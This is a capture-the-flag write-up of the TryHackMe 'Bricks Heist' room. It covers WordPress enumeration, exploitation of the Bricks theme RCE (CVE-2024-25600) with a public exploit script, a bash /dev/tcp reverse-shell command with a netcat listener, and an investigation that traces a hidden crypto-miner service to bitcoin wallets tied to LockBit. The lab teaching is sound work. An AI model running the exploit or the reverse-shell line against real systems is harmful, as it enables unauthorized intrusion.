## TryHack3M: Bricks Heist - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/tryhack3mbricksheist)

**IP: bricks.thm**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Blue Team <br>

**Tools Used**: Nmap, Wpscan<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap and Wpscan since when I visited the web app, Wappalyzer did it's job.

  ```
  nmap -sC -sV -T5 -p- bricks.thm 

  PORT     STATE SERVICE  VERSION
  22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 8c:de:c7:ad:31:96:c6:3c:ca:4d:ae:43:db:b3:41:58 (RSA)
  |   256 d3:2c:78:bc:2e:d5:95:72:11:12:a5:c4:8a:b6:6c:02 (ECDSA)
  |_  256 50:e0:07:b9:9c:ba:3d:8e:8c:ec:6e:19:58:ea:eb:3a (ED25519)
  80/tcp   open  http     Python http.server 3.5 - 3.10
  |_http-title: Error response
  |_http-server-header: WebSockify Python/3.8.10
  443/tcp  open  ssl/http Apache httpd
  |_http-title: Brick by Brick
  |_http-generator: WordPress 6.5
  | tls-alpn: 
  |   h2
  |_  http/1.1
  | http-robots.txt: 1 disallowed entry 
  |_/wp-admin/
  | ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
  | Not valid before: 2024-04-02T11:59:14
  |_Not valid after:  2025-04-02T11:59:14
  |_http-server-header: Apache
  |_ssl-date: TLS randomness does not represent time
  3306/tcp open  mysql    MySQL (unauthorized)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  wpscan --url https://bricks.thm --disable-tls-checks 

  Interesting Finding(s):
  
  [+] Headers
   | Interesting Entry: server: Apache
   | Found By: Headers (Passive Detection)
   | Confidence: 100%
  
  [+] robots.txt found: https://bricks.thm/robots.txt
   | Interesting Entries:
   |  - /wp-admin/
   |  - /wp-admin/admin-ajax.php
   | Found By: Robots Txt (Aggressive Detection)
   | Confidence: 100%
  
  [+] XML-RPC seems to be enabled: https://bricks.thm/xmlrpc.php
   | Found By: Direct Access (Aggressive Detection)
   | Confidence: 100%
   | References:
   |  - http://codex.wordpress.org/XML-RPC_Pingback_API
   |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
   |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
   |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
   |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
  
  [+] WordPress readme found: https://bricks.thm/readme.html
   | Found By: Direct Access (Aggressive Detection)
   | Confidence: 100%
  
  [+] The external WP-Cron seems to be enabled: https://bricks.thm/wp-cron.php
   | Found By: Direct Access (Aggressive Detection)
   | Confidence: 60%
   | References:
   |  - https://www.iplocation.net/defend-wordpress-from-ddos
   |  - https://github.com/wpscanteam/wpscan/issues/1299
  
  [+] WordPress version 6.5 identified (Insecure, released on 2024-04-02).
   | Found By: Rss Generator (Passive Detection)
   |  - https://bricks.thm/feed/, <generator>https://wordpress.org/?v=6.5</generator>
   |  - https://bricks.thm/comments/feed/, <generator>https://wordpress.org/?v=6.5</generator>
  
  [+] WordPress theme in use: bricks
   | Location: https://bricks.thm/wp-content/themes/bricks/
   | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
   | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
   | Style Name: Bricks
   | Style URI: https://bricksbuilder.io/
   | Description: Visual website builder for WordPress....
   | Author: Bricks
   | Author URI: https://bricksbuilder.io/
   |
   | Found By: Urls In Homepage (Passive Detection)
   | Confirmed By: Urls In 404 Page (Passive Detection)
   |
   | Version: 1.9.5 (80% confidence)
   | Found By: Style (Passive Detection)
   |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'
  ```
  
- Note: If you run wpscan without `--disable-tls-checks` you'll get this error:

  ```
  Scan Aborted: The url supplied 'https://bricks.thm/' seems to be down (SSL peer certificate or SSH remote key was not OK)
  ```

---

## ⚙️ Shell Access

- Now, I immediately look for `Bricks theme exploits` and found 2 bad bois:

  ```
  https://github.com/Chocapikk/CVE-2024-25600/blob/main/exploit.py
  https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/blob/main/CVE-2024-25600.py
  ```
  
- I decided to use the second one since it has a cool ASCII art and I love ASCII art! (just look at my own tools...)

  ```
  python3 CVE-2024-25600.py -u https://bricks.thm/

     _______    ________    ___   ____ ___  __ __       ___   ___________ ____  ____
    / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \
   / /    | | / / __/________/ // / / /_/ / // /_________/ //___ \/ __ \/ / / / / / /
  / /___  | |/ / /__/_____/ __// /_/ / __/__  __/_____/ __/____/ / /_/ / /_/ / /_/ /
  \____/  |___/_____/    /____/\____/____/ /_/       /____/_____/\____/\____/\____/
      
  Coded By: K3ysTr0K3R --> Hello, Friend!
  
  [*] Checking if the target is vulnerable
  [+] The target is vulnerable
  [*] Initiating exploit against: https://bricks.thm/
  [*] Initiating interactive shell
  [+] Interactive shell opened successfully
  Shell> whoami
  apache
  
  Shell> ls -al
  total 260
  drwxr-xr-x  7 apache apache  4096 May 30 18:04 .
  drwxr-xr-x  3 root   root    4096 Apr  2  2024 ..
  -rw-r--r--  1 apache apache   523 Apr  2  2024 .htaccess
  -rw-r--r--  1 root   root      43 Apr  5  2024 650c844110baced87e1606453b93f22a.txt
  -rw-r--r--  1 apache apache   405 Apr  2  2024 index.php
  drwxr-xr-x  7 apache apache  4096 Apr 12  2023 kod
  -rw-r--r--  1 apache apache 19915 Apr  4  2024 license.txt
  drwxr-xr-x 15 apache apache  4096 Apr  2  2024 phpmyadmin
  -rw-r--r--  1 apache apache  7401 Apr  4  2024 readme.html
  -rw-r--r--  1 apache apache  7387 Apr  4  2024 wp-activate.php
  drwxr-xr-x  9 apache apache  4096 Apr  2  2024 wp-admin
  -rw-r--r--  1 apache apache   351 Apr  2  2024 wp-blog-header.php
  -rw-r--r--  1 apache apache  2323 Apr  2  2024 wp-comments-post.php
  -rw-r--r--  1 apache apache  3012 Apr  4  2024 wp-config-sample.php
  -rw-rw-rw-  1 apache apache  3288 Apr  2  2024 wp-config.php
  drwxr-xr-x  6 apache apache  4096 May 30 18:04 wp-content
  -rw-r--r--  1 apache apache  5638 Apr  2  2024 wp-cron.php
  drwxr-xr-x 30 apache apache 16384 Apr  4  2024 wp-includes
  -rw-r--r--  1 apache apache  2502 Apr  2  2024 wp-links-opml.php
  -rw-r--r--  1 apache apache  3927 Apr  2  2024 wp-load.php
  -rw-r--r--  1 apache apache 50917 Apr  4  2024 wp-login.php
  -rw-r--r--  1 apache apache  8525 Apr  2  2024 wp-mail.php
  -rw-r--r--  1 apache apache 28427 Apr  4  2024 wp-settings.php
  -rw-r--r--  1 apache apache 34385 Apr  2  2024 wp-signup.php
  -rw-r--r--  1 apache apache  4885 Apr  2  2024 wp-trackback.php
  -rw-r--r--  1 apache apache  3246 Apr  4  2024 xmlrpc.php
  ```
  
- Now read the first flag and do a reverse bash shell since it is more stable than this one that we already have.

  ```
  Shell> bash -c 'exec bash -i >& /dev/tcp/[YOUR-THM-IP]/4444 0>&1'

  nc -lvnp 4444       
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.27.243] 54898
  bash: cannot set terminal process group (1288): Inappropriate ioctl for device
  bash: no job control in this shell
  apache@tryhackme:/data/www/default$ whoami
  whoami
  apache
  apache@tryhackme:/data/www/default$ id
  id
  uid=1001(apache) gid=1001(apache) groups=1001(apache)
  ```

---

## 🧍 Investigation

- Use the command provided in the hint in order to find suspicious file.

  ```
  apache@tryhackme:/data/www/default$ systemctl | grep running

  proc-sys-fs-binfmt_misc.automount                loaded active     running   Arbitrary Executable File Formats File System Automount Point                
  acpid.path                                       loaded active     running   ACPI Events Check                                                            
  init.scope                                       loaded active     running   System and Service Manager                                                   
  session-c1.scope                                 loaded active     running   Session c1 of user lightdm                                                   
  accounts-daemon.service                          loaded active     running   Accounts Service                                                             
  acpid.service                                    loaded active     running   ACPI event daemon                                                            
  atd.service                                      loaded active     running   Deferred execution scheduler                                                 
  avahi-daemon.service                             loaded active     running   Avahi mDNS/DNS-SD Stack                                                      
  badr.service                                     loaded active     running   Badr Service                                                                 
  cron.service                                     loaded active     running   Regular background program processing daemon                                 
  cups-browsed.service                             loaded active     running   Make remote CUPS printers available locally                                  
  cups.service                                     loaded active     running   CUPS Scheduler                                                               
  dbus.service                                     loaded active     running   D-Bus System Message Bus                                                     
  getty@tty1.service                               loaded active     running   Getty on tty1                                                                
  httpd.service                                    loaded active     running   LSB: starts Apache Web Server                                                
  irqbalance.service                               loaded active     running   irqbalance daemon                                                            
  kerneloops.service                               loaded active     running   Tool to automatically collect and submit kernel crash signatures             
  lightdm.service                                  loaded active     running   Light Display Manager                                                        
  ModemManager.service                             loaded active     running   Modem Manager                                                                
  multipathd.service                               loaded active     running   Device-Mapper Multipath Device Controller                                    
  mysqld.service                                   loaded active     running   LSB: start and stop MySQL                                                    
  networkd-dispatcher.service                      loaded active     running   Dispatcher daemon for systemd-networkd                                       
  NetworkManager.service                           loaded active     running   Network Manager                                                              
  polkit.service                                   loaded active     running   Authorization Manager                                                        
  rsyslog.service                                  loaded active     running   System Logging Service                                                       
  rtkit-daemon.service                             loaded active     running   RealtimeKit Scheduling Policy Service                                        
  serial-getty@ttyS0.service                       loaded active     running   Serial Getty on ttyS0                                                        
  snap.amazon-ssm-agent.amazon-ssm-agent.service   loaded active     running   Service for snap application amazon-ssm-agent.amazon-ssm-agent               
  snapd.service                                    loaded active     running   Snap Daemon                                                                  
  ssh.service                                      loaded active     running   OpenBSD Secure Shell server                                                  
  switcheroo-control.service                       loaded active     running   Switcheroo Control Proxy service                                             
  systemd-journald.service                         loaded active     running   Journal Service                                                              
  systemd-logind.service                           loaded active     running   Login Service                                                                
  systemd-networkd.service                         loaded active     running   Network Service                                                              
  systemd-resolved.service                         loaded active     running   Network Name Resolution                                                      
  systemd-timesyncd.service                        loaded active     running   Network Time Synchronization                                                 
  systemd-udevd.service                            loaded active     running   udev Kernel Device Manager                                                   
  ubuntu.service                                   loaded active     running   TRYHACK3M                                                                    
  udisks2.service                                  loaded active     running   Disk Manager                                                                 
  unattended-upgrades.service                      loaded active     running   Unattended Upgrades Shutdown                                                 
  upower.service                                   loaded active     running   Daemon for power management                                                  
  user@1000.service                                loaded active     running   User Manager for UID 1000                                                    
  user@114.service                                 loaded active     running   User Manager for UID 114                                                     
  whoopsie.service                                 loaded active     running   crash report submission daemon                                               
  wpa_supplicant.service                           loaded active     running   WPA supplicant                                                               
  acpid.socket                                     loaded active     running   ACPID Listen Socket                                                          
  avahi-daemon.socket                              loaded active     running   Avahi mDNS/DNS-SD Stack Activation Socket                                    
  cups.socket                                      loaded active     running   CUPS Scheduler                                                               
  dbus.socket                                      loaded active     running   D-Bus System Message Bus Socket                                              
  multipathd.socket                                loaded active     running   multipathd control socket                                                    
  snapd.socket                                     loaded active     running   Socket activation for snappy daemon                                          
  syslog.socket                                    loaded active     running   Syslog Socket                                                                
  systemd-journald-audit.socket                    loaded active     running   Journal Audit Socket                                                         
  systemd-journald-dev-log.socket                  loaded active     running   Journal Socket (/dev/log)                                                    
  systemd-journald.socket                          loaded active     running   Journal Socket                                                               
  systemd-networkd.socket                          loaded active     running   Network Service Netlink Socket                                               
  systemd-udevd-control.socket                     loaded active     running   udev Control Socket                                                          
  systemd-udevd-kernel.socket                      loaded active     running   udev Kernel Socket
  ```
  
- Let's get more details about it.

  ```
  apache@tryhackme:/data/www/default$ systemctl cat ubuntu.service
  # /etc/systemd/system/ubuntu.service
  [Unit]
  Description=TRYHACK3M
  
  [Service]
  Type=simple
  ExecStart=/lib/NetworkManager/nm-inet-dialog
  Restart=on-failure
  
  [Install]
  WantedBy=multi-user.target
  ```
  
- Since malicious file `nm-inet-dialog` is in the `/lib/NetworkManager/` directory, let's see what else is there.

  ```
  apache@tryhackme:/data/www/default$ ls -al /lib/NetworkManager/
  total 8636
  drwxr-xr-x   6 root root    4096 Apr  8  2024 .
  drwxr-xr-x 148 root root   12288 Apr  2  2024 ..
  drwxr-xr-x   2 root root    4096 Feb 27  2022 VPN
  drwxr-xr-x   2 root root    4096 Apr  3  2024 conf.d
  drwxr-xr-x   5 root root    4096 Feb 27  2022 dispatcher.d
  -rw-r--r--   1 root root   48190 Apr 11  2024 inet.conf
  -rwxr-xr-x   1 root root   14712 Feb 16  2024 nm-dhcp-helper
  -rwxr-xr-x   1 root root   47672 Feb 16  2024 nm-dispatcher
  -rwxr-xr-x   1 root root  843048 Feb 16  2024 nm-iface-helper
  -rwxr-xr-x   1 root root 6948448 Apr  8  2024 nm-inet-dialog
  -rwxr-xr-x   1 root root  658736 Feb 16  2024 nm-initrd-generator
  -rwxr-xr-x   1 root root   27024 Mar 11  2020 nm-openvpn-auth-dialog
  -rwxr-xr-x   1 root root   59784 Mar 11  2020 nm-openvpn-service
  -rwxr-xr-x   1 root root   31032 Mar 11  2020 nm-openvpn-service-openvpn-helper
  -rwxr-xr-x   1 root root   51416 Nov 27  2018 nm-pptp-auth-dialog
  -rwxr-xr-x   1 root root   59544 Nov 27  2018 nm-pptp-service
  drwxr-xr-x   2 root root    4096 Nov 27  2021 system-connections
  ```

- Cool, we found a log name as well `inet.conf` so check it out.

  ```
  apache@tryhackme:/lib/NetworkManager$ cat inet.conf
  [SNIP!]
  2024-04-11 10:52:52,419 [*] Miner()
  2024-04-11 10:52:54,421 [*] Miner()
  2024-04-11 10:52:56,431 [*] Miner()
  2024-04-11 10:52:58,433 [*] Miner()
  2024-04-11 10:53:00,444 [*] Miner()
  2024-04-11 10:53:02,447 [*] Miner()
  2024-04-11 10:53:04,453 [*] Miner()
  2024-04-11 10:53:06,455 [*] Miner()
  2024-04-11 10:53:08,457 [*] Miner()
  2024-04-11 10:53:10,465 [*] Miner()
  2024-04-11 10:53:12,467 [*] Miner()
  2024-04-11 10:53:14,470 [*] Miner()
  2024-04-11 10:53:16,472 [*] Miner()
  2024-04-11 10:53:18,474 [*] Miner()
  2024-04-11 10:53:20,477 [*] Miner()
  2024-04-11 10:53:22,488 [*] Miner()
  2024-04-11 10:53:24,491 [*] Miner()
  2024-04-11 10:53:26,493 [*] Miner()
  2024-04-11 10:53:28,496 [*] Miner()
  2024-04-11 10:53:30,498 [*] Miner()
  2024-04-11 10:53:32,500 [*] Miner()
  2024-04-11 10:53:34,503 [*] Miner()
  2024-04-11 10:53:36,504 [*] Miner()
  2024-04-11 10:53:38,508 [*] Miner()
  2024-04-11 10:53:40,510 [*] Miner()
  2024-04-11 10:53:42,518 [*] Miner()
  2024-04-11 10:53:44,524 [*] Miner()
  2024-04-11 10:53:46,527 [*] Miner()
  2024-04-11 10:53:48,529 [*] Miner()
  2024-04-11 10:53:50,532 [*] Miner()
  2024-04-11 10:53:52,534 [*] Miner()
  ```

- That wasn't useful, use `head` to see the first few rows of the file.

  ```
  apache@tryhackme:/lib/NetworkManager$ head inet.conf 
  ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b61[SNIP!]6497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
  2024-04-08 10:46:04,743 [*] confbak: Ready!
  2024-04-08 10:46:04,743 [*] Status: Mining!
  2024-04-08 10:46:08,745 [*] Miner()
  2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
  2024-04-08 10:46:08,745 [*] Status: Mining!
  2024-04-08 10:46:10,747 [*] Miner()
  2024-04-08 10:46:12,748 [*] Miner()
  2024-04-08 10:46:14,751 [*] Miner()
  2024-04-08 10:46:16,753 [*] Miner()
  ```

- Now we need to start decoding the `ID`. It's Hex encoded then Bases. I used my own script and terminal.

  ```
  What you wanna do? encode or decode? decode
  Enter Hex string for decoding: 5757314e65474e5962484a4f656d787457544e424[SNIP!]959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
  Decode Hex value: WW1NeGNYbHJOemxtWTNBNWFHUTFhM0psY0hKalpUZzVkR3RvTkhkeWRHdzRZWFowTkd3Mk4zRmhZbU14Y1hsck56bG1ZM0E1YUdGa05XdHlaWEJ5WTJVNE9YUnJhRFIzY25Sc09HRjJkRFJzTmpkeFlRPT0=
  
  echo 'WW1NeGNYbHJOemxtWTNBNWFHUTFhM0psY0hKalpUZzVkR3RvTkhkeWRHdzRZWFowTkd3Mk4zRmhZbU14Y1hsck56bG1ZM0E1YUdGa05XdHlaWEJ5WTJVNE9YUnJhRFIzY25Sc09HRjJkRFJzTmpkeFlRPT0=' | base64 -d
  YmMxcXlrNzlmY3A5aGQ1a3JlcHJjZTg5dGtoNHdydGw4YXZ0NGw2N3FhYmMxcXlrNzlmY3A5aGFkNWtyZXByY2U4OXRraDR3cnRsOGF2dDRsNjdxYQ==
  
  echo 'YmMxcXlrNzlmY3A5aGQ1a3JlcHJjZTg5dGtoNHdydGw4YXZ0NGw2N3FhYmMxcXlrNzlmY3A5aGFkNWtyZXByY2U4OXRraDR3cnRsOGF2dDRsNjdxYQ==' | base64 -d
  bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
  ```

- So I spent a while here trying to decode `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa` until I realized that this is actually 2 bitcoin addresses.

  ```
  bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa 
  bc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
  ```

- For the last question I used `blockchain.com`. Paste the address and start searching for another address that will link to a cyber threat group. I'll show oyu which one it is so you don't waste your time.

  ```
  From:
  bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
  
  To:
  bc1q4xh8cmyp5e4cus660ah2jv3ja8pg7fgml8lj3g
  
  32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM
  ```

- When I searched this one `32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM` in the browser, I found this site `https://ofac.treasury.gov/recent-actions/20240220`. When you visit it, you can find the group name at the top.

  ```United States Sanctions Affiliates of Russia-Based LockBit Ransomware Group```

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Realising that one string is actualy 2 bitcoin addresses...`

- What did I learn?
  `Some investigation stuff????`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
